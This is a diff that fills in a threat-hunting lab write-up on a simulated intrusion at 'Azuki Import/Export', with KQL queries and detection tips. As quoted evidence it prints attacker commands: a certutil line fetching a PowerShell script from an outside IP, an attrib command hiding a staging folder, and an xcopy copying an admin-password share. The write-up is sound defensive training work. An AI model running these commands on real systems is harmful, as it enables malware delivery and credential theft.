@@ -1,10 +1,14 @@
-Markdown# New Threat Hunt Report - Cargo Hold
-*Lab Environment: [e.g., Cyber Range VM] | Date: [Current Date] | Tools: [e.g., KQL in Log Analytics]*
+<p align="center">
+  <img
+    src="https://github.com/user-attachments/assets/91a89840-4446-4ad4-a020-94d57c079f47"
+    alt="image"
+    width="518"
+    height="777"
+  />
+</p>
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/e3f3299b-68f1-4402-a994-2856a61803cc" />
 
-
-# 🚩 INCIDENT BRIEF - Azuki Import/Export - 梓貿易株式会社
+# INCIDENT BRIEF - Cargo Hold -Azuki Import/Export - 梓貿易株式会社
 
 **📋 INCIDENT BRIEF**
 
@@ -492,35 +496,50 @@ DeviceProcessEvents
 Attackers establish staging locations to organise tools and stolen data before exfiltration. This directory path is a critical IOC.
 
 **📌 Finding**  
-[Your finding/answer here, e.g., specific command or artifact.]
+C:\Windows\Logs\CBS
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | [e.g., victim-vm]                          |
-| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
-| Process          | [e.g., powershell.exe]                     |
-| Parent Process   | [e.g., explorer.exe]                       |
-| Command Line     | `[Your command line here]`                 |
+| Host             | azuki-fileserver01                          |
+| Timestamp        | 2025-11-22T00:55:43.9986049Z             |
+| Process          | attrib.exe                  |
+| Parent Process   | powershell.exe                    |
+| Command Line     | "attrib.exe" +h +s C:\Windows\Logs\CBS"               |
 
 **💡 Why it matters**  
-[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]
+Attackers commonly create staging directories to aggregate tools, scripts, and collected data before exfiltration, reducing noise and improving operational efficiency. Placing a staging directory under a trusted Windows path such as C:\Windows\Logs\CBS helps the activity blend into legitimate system files and evade casual inspection. The prior use of attribute manipulation to hide this directory further reinforces intent to conceal attacker activity rather than normal administrative use. This behavior aligns with MITRE ATT&CK T1074.001 – Data Staged: Local Data Staging, often observed shortly before data exfiltration or lateral movement. When a hidden staging directory is identified on a server, it represents a high-confidence indicator of post-compromise collection activity.
 
 **🔧 KQL Query Used**
 ```
-[Your exact KQL query here]
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has_any ("{", "[", "+", "|") 
+| where InitiatingProcessFileName == "powershell.exe"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
 ```
 **🖼️ Screenshot**
-[Your screenshot here]
+<img width="772" height="94" alt="image" src="https://github.com/user-attachments/assets/8b7e09c1-be33-4685-9bec-30fff23b4b7c" />
+
 
 **🛠️ Detection Recommendation**
 
 **Hunting Tip:**  
-[Your Tip here]
+Hunt for suspicious directories created or modified within trusted Windows paths that are rarely used for custom data storage. Focus on directories that are hidden, system-marked, or accessed by scripting engines rather than standard Windows services. Correlating directory creation or modification with prior discovery and defense evasion activity can help identify active staging locations before exfiltration occurs.
 
 ```
-[Your exact KQL query here]
+DeviceFileEvents
+| where TimeGenerated > ago(30d)
+| where FolderPath startswith @"C:\Windows\"
+| where ActionType in ("FileCreated", "FolderCreated", "FileModified")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe")
+| extend SuspiciousPath = FolderPath
+| project TimeGenerated, DeviceName, AccountName, ActionType, SuspiciousPath, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+
 ```
 
 
@@ -530,32 +549,38 @@ Attackers establish staging locations to organise tools and stolen data before e
 <br>
 
 
-### 🚩 Flag # – [Flag Title]
+### 🚩 Flag #10: DEFENSE EVASION - Script Download Command
 **🎯 Objective**  
-[Describe the objective of this flag in 1-2 sentences.]
+Legitimate system utilities with network capabilities are frequently weaponized to download malware while evading detection.
 
 **📌 Finding**  
-[Your finding/answer here, e.g., specific command or artifact.]
+"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1"
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | [e.g., victim-vm]                          |
-| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
-| Process          | [e.g., powershell.exe]                     |
-| Parent Process   | [e.g., explorer.exe]                       |
-| Command Line     | `[Your command line here]`                 |
+| Host             | azuki-fileserver01                         |
+| Timestamp        | 2025-11-22T00:56:47.4100711Z               |
+| Process          | certutil.exe                    |
+| Parent Process   | powershell.exe                      |
+| Command Line     | `certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`                 |
 
 **💡 Why it matters**  
 [Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]
 
 **🔧 KQL Query Used**
 ```
-[Your exact KQL query here]
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| where InitiatingProcessFileName == "powershell.exe" and InitiatingProcessCommandLine !contains "Windows Defender Advanced Threat Protection"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
 ```
 **🖼️ Screenshot**
-[Your screenshot here]
+<img width="1743" height="612" alt="image" src="https://github.com/user-attachments/assets/601dffcf-0524-4e25-8ed0-b4f9984a9255" />
+
 
 **🛠️ Detection Recommendation**
 
@@ -571,40 +596,60 @@ Attackers establish staging locations to organise tools and stolen data before e
 <hr>
 <br>
 
-### 🚩 Flag # – [Flag Title]
+### 🚩 Flag #11: COLLECTION - Credential File Discovery
 **🎯 Objective**  
-[Describe the objective of this flag in 1-2 sentences.]
+Credential files provide keys to the kingdom - enabling lateral movement and privilege escalation across the network.
 
 **📌 Finding**  
-[Your finding/answer here, e.g., specific command or artifact.]
+IT-Admin-Passwords.csv
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | [e.g., victim-vm]                          |
-| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
-| Process          | [e.g., powershell.exe]                     |
-| Parent Process   | [e.g., explorer.exe]                       |
-| Command Line     | `[Your command line here]`                 |
+| Host             | azuki-fileserver01                         |
+| Timestamp        | 2025-11-22T01:07:53.6746323Z               |
+| Process          | xcopy.exe                    |
+| Parent Process   | N/A                      |
+| Command Line     | `xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`                 |
 
 **💡 Why it matters**  
-[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]
+Credential files such as spreadsheets or CSVs containing administrative passwords represent some of the highest-value assets an attacker can obtain during an intrusion. By copying an entire IT administrator directory into a hidden staging location, the attacker is clearly preparing credentials for later use, exfiltration, or offline analysis. 
+
+Possession of valid admin credentials enables rapid lateral movement, privilege escalation, and often full domain compromise without the need for noisy exploitation. This activity maps directly to MITRE ATT&CK T1552.001 – Unsecured Credentials: Credentials in Files, a technique frequently observed in real-world breaches and ransomware operations. 
+
+File copy utilities like xcopy.exe performing bulk transfers from file shares into concealed directories are a strong, high-signal indicator of credential harvesting rather than legitimate administration.
 
 **🔧 KQL Query Used**
 ```
-[Your exact KQL query here]
+let timeofattack = todatetime('2025-11-22T00:40:29.5749856Z');
+DeviceFileEvents
+| where TimeGenerated  between ((timeofattack - 1h) .. (timeofattack + 1h))
+| where DeviceName contains "azuki"
+| where InitiatingProcessAccountName != "system"
+| where ActionType == "FileCreated"
+| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
 ```
 **🖼️ Screenshot**
-[Your screenshot here]
+<img width="1770" height="689" alt="image" src="https://github.com/user-attachments/assets/f65f2dc2-5671-46f1-923a-f6d721a5399d" />
+
 
 **🛠️ Detection Recommendation**
 
 **Hunting Tip:**  
-[Your Tip here]
+Hunt for non-system users copying large numbers of files from shared directories—especially IT, Finance, or Admin shares—into uncommon or hidden system paths. Prioritize activity involving archive, copy, or synchronization utilities staging data shortly after discovery or credential access events, as this often precedes exfiltration or lateral movement.
 
 ```
-[Your exact KQL query here]
+DeviceFileEvents
+| where TimeGenerated > ago(30d)
+| where ActionType in ("FileCreated", "FileCopied")
+| where InitiatingProcessFileName in ("xcopy.exe", "robocopy.exe", "powershell.exe", "cmd.exe")
+| where FolderPath has_any ("\\FileShares\\", "\\IT", "\\Admin")
+| where FolderPath has_any ("\\Windows\\Logs\\", "\\ProgramData\\", "\\Temp")
+| where InitiatingProcessAccountName != "SYSTEM"
+| project TimeGenerated, DeviceName, AccountName=InitiatingProcessAccountName,
+          FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
 
 
